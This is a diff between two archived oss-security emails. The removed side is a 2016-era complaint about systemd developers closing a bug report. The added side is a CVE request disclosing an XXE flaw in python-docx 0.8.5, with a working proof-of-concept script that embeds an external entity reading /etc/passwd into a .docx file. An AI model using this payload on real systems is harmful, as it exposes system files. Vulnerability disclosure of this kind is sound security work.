@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1667" "Friday" "7" "July" "2017" "00:34:01" "+0200" "Martin Steigerwald" "martin@lichtvoll.de" "<4674075.e61U45ziGm@merkaba>" "45" "Re: [oss-security] systemd fails to parse user that should run service" "^Date:" nil nil "7" "2017070622:34:01" "[oss-security] systemd fails to parse user that should run service" (number mark "        martin@licht Jul  7   45/1667  " thread-indent "\"Re: [oss-security] systemd fails to parse user that should run service\"\n") "<20170706211258.gkd5rhnsononht6f@perpetual.pseudorandom.co.uk>" ("<VI1PR04MB310470DAAF5F79C8BA8AE789D6D10@VI1PR04MB3104.eurprd04.prod.outlook.com>" "<20170706192753.GA9945@takahe.colorado.edu>" "<20170706211258.gkd5rhnsononht6f@perpetual.pseudorandom.co.uk>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2701" "Tuesday" "28" "June" "2016" "17:31:22" "-0400" "Pierre Ernst" "pernst@salesforce.com" "<CAO8=cJ9uNJNtPb-GVqq168h4ODCkaxS6W+bX2DFMtpty-MJh2g@mail.gmail.com>" "100" "[oss-security] CVE request - python-docx 0.8.5 - XXE" nil nil nil "6" "2016062821:31:22" "[oss-security] CVE request - python-docx 0.8.5 - XXE" (number mark "U       pernst@sales Jun 28  100/2701  " thread-indent "\"[oss-security] CVE request - python-docx 0.8.5 - XXE\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 11433 invoked by uid 550); 6 Jul 2017 22:37:21 -0000
+Received: (qmail 5913 invoked by uid 550); 28 Jun 2016 22:04:20 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,62 +11,133 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 8033 invoked from network); 6 Jul 2017 22:34:15 -0000
-Message-ID: <4674075.e61U45ziGm@merkaba>
-User-Agent: KMail/5.2.3 (Linux/4.10.17-tp520-btrfstrim+; KDE/5.28.0; x86_64; ; )
-In-Reply-To: <20170706211258.gkd5rhnsononht6f@perpetual.pseudorandom.co.uk>
-References: <VI1PR04MB310470DAAF5F79C8BA8AE789D6D10@VI1PR04MB3104.eurprd04.prod.outlook.com> <20170706192753.GA9945@takahe.colorado.edu> <20170706211258.gkd5rhnsononht6f@perpetual.pseudorandom.co.uk>
-MIME-Version: 1.0
-Content-Transfer-Encoding: quoted-printable
-Content-Type: text/plain; charset="UTF-8"
-Date: Fri, 07 Jul 2017 00:34:01 +0200
-From: Martin Steigerwald <martin@lichtvoll.de>
 Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] systemd fails to parse user that should run service
+Received: (qmail 20266 invoked from network); 28 Jun 2016 21:31:35 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=salesforce.com; s=google;
+        h=mime-version:from:date:message-id:subject:to;
+        bh=w9dLQml9ieudd7hRg1qrrh8kjyTaAL/IQ3h50FRNehs=;
+        b=eQbP+3/rlb93k+30sXIGxfJGlE94Z2pB1oRlHryk8siAjWU6iyxEp6OJYxP4VdT+Q1
+         VTM2GLVSP4uOaZJPrPUpyt3+0n8VxED/TEyBATB+OXWNMVLEu4RszQuBcWJb0/rVbIN0
+         IKB1WUEGspihft1clfoOaNXl9uv/CmKyf4Zwg=
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20130820;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
+        bh=w9dLQml9ieudd7hRg1qrrh8kjyTaAL/IQ3h50FRNehs=;
+        b=SRXDtpYcQGwBNkG3UcDm8lJE0Zo/1x7NVys9ueFb8fnXMYdlWKEgDOjYRyh5yAd8rb
+         XWXfHOPTsrfShZR0PPFVoTfTOl4Jxgr3hV/vg6WWdU9RF1kgQQ/GoaAUEKQ/tWa2moos
+         FSWUXZQ8F2BOnYO9tcmHybwjddn5AmQb1wBbJk+uyuwZjIN6Tyci/dzAurSD9OLY1Ut2
+         ZXHCmJAE3FUYtYzWj5asjevloSy1ptaBITuJd8MnLqu58VFLioKSoZMQFLHE6eEw3uCT
+         CyRxM/NlOqwfPpLOPLL2UlVb/F0qQSoXPfXAkyVRnvkIrgiELOJfv3k7FyX3FnSlqP4D
+         /Fgw==
+X-Gm-Message-State: ALyK8tI3+dIvQ6oasBh2BTtXGcy8r8Z0ow7AjQUksuOdDQXr9M6qxGdMjehbrdi/lumlvG0ASCtA96kJL76Evv+V
+X-Received: by 10.157.35.111 with SMTP id k44mr3612542otd.18.1467149482588;
+ Tue, 28 Jun 2016 14:31:22 -0700 (PDT)
+MIME-Version: 1.0
+From: Pierre Ernst <pernst@salesforce.com>
+Date: Tue, 28 Jun 2016 17:31:22 -0400
+Message-ID: <CAO8=cJ9uNJNtPb-GVqq168h4ODCkaxS6W+bX2DFMtpty-MJh2g@mail.gmail.com>
 To: oss-security@lists.openwall.com
+Content-Type: text/plain; charset=UTF-8
+Subject: [oss-security] CVE request - python-docx 0.8.5 - XXE
 
-Simon McVittie - 06.07.17, 22:12:
-> In general the same is true for the *values* of directives: systemd needs
-> to choose something to do about known directives with values that it
-> cannot understand, and in general they are ignored with a warning on
-> the assumption that the new value is something that might have been
-> understood by a newer version of systemd. That isn't appropriate for
-> all directives, hence <https://github.com/systemd/systemd/pull/6300>.
+The python-docx package
+(https://github.com/python-openxml/python-docx) is vulnerable to XML
+External Entity attacks (XXE).
 
-Finally. Thanks.
+Version 0.8.6 (https://github.com/python-openxml/python-docx/releases/tag/v0.8.6)
+contains a fix.
 
-Now: Instead of closing the original issue as *not a bug*, it would have be=
-en=20
-an approbiate reaction to fix the issue and then close the bug. This is wha=
-t=20
-upsets me most: Upstream developer behavior regarding the original github=20
-issue was inapprobiate.
+I would like to thanks Steve Canny for the prompt response.
 
-Taking the issue seriously from the beginning would additionally have avoid=
-ed=20
-all of the discussion here and elsewhere. What triggered the discussion was=
-=20
-that upstream developers basically explained "this is not a bug, go away" a=
-nd=20
-this=E2=80=A6 in my perception in an arrogant "we know better than you tone=
-".
+The following POC has been tested on version 0.8.5.
 
-My hope is that some day the upstream developers of Systemd who handled the=
-=20
-original github issue the way they did, wake up=E2=80=A6 and reconsider whe=
-ther their=20
-behavior is approbiate and if not=E2=80=A6 change it. Cause from what I saw=
- in the=20
-last years, there is a pattern to handle bugs by quickly closing them as no=
-t a=20
-bug. A pattern that even Linus himself criticized=E2=80=A6 rightfully so=E2=
-=80=A6 in clear=20
-words.
+Older versions of the package might be vulnerable as well.
 
-There is a social, a behavorial issue here=E2=80=A6 which IMHO is even more=
- important=20
-than the technical one.
 
-Thank you.
---=20
-Martin
+import docx
+import zipfile
+import tempfile
+import os
+
+# define malicious XML
+xml_string = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE w:document [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
+]>
+<w:document xmlns:o="urn:schemas-microsoft-com:office:office"
+xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
+xmlns:v="urn:schemas-microsoft-com:vml"
+xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
+xmlns:w10="urn:schemas-microsoft-com:office:word"
+xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing">
+<w:body>
+<w:p>
+<w:pPr>
+<w:pStyle w:val="Normal" />
+<w:rPr></w:rPr>
+</w:pPr>
+<w:r>
+<w:rPr></w:rPr>
+<w:t>
+Pierre Ernst, Salesforce --[&xxe;]--
+</w:t>
+</w:r>
+</w:p>
+<w:p>
+<w:pPr>
+<w:pStyle w:val="Normal" />
+<w:rPr></w:rPr>
+</w:pPr>
+<w:r>
+<w:rPr></w:rPr>
+<w:t></w:t>
+</w:r>
+</w:p>
+<w:sectPr>
+<w:type w:val="nextPage" />
+<w:pgSz w:w="12240" w:h="15840" />
+<w:pgMar w:left="1134" w:right="1134" w:header="0" w:top="1134"
+w:footer="0" w:bottom="1134" w:gutter="0" />
+<w:pgNumType w:fmt="decimal" />
+<w:formProt w:val="false" />
+<w:textDirection w:val="lrTb" />
+</w:sectPr>
+</w:body>
+</w:document>'''
+
+# source: http://stackoverflow.com/questions/25738523/how-to-update-one-file-inside-zip-file-using-python
+def updateZip(zipname, filename, data):
+    # generate a temp file
+    tmpfd, tmpname = tempfile.mkstemp(dir=os.path.dirname(zipname))
+    os.close(tmpfd)
+
+    # create a temp copy of the archive without filename
+    with zipfile.ZipFile(zipname, 'r') as zin:
+        with zipfile.ZipFile(tmpname, 'w') as zout:
+            for item in zin.infolist():
+                if item.filename != filename:
+                    zout.writestr(item, zin.read(item.filename))
+
+    # replace with the temp archive
+    os.remove(zipname)
+    os.rename(tmpname, zipname)
+
+    # now add filename with its new data
+    with zipfile.ZipFile(zipname, mode='a',
+compression=zipfile.ZIP_DEFLATED) as zf:
+        zf.writestr(filename, data)
+
+# update legit docx file with malicious XML
+updateZip('whatever.docx', 'word/document.xml', xml_string)
+
+# process with python-docx
+document = docx.Document('whatever.docx')
+print '\n\n'.join([paragraph.text for paragraph in document.paragraphs])
+
+
+
+
+-- 
+Pierre Ernst
+Salesforce
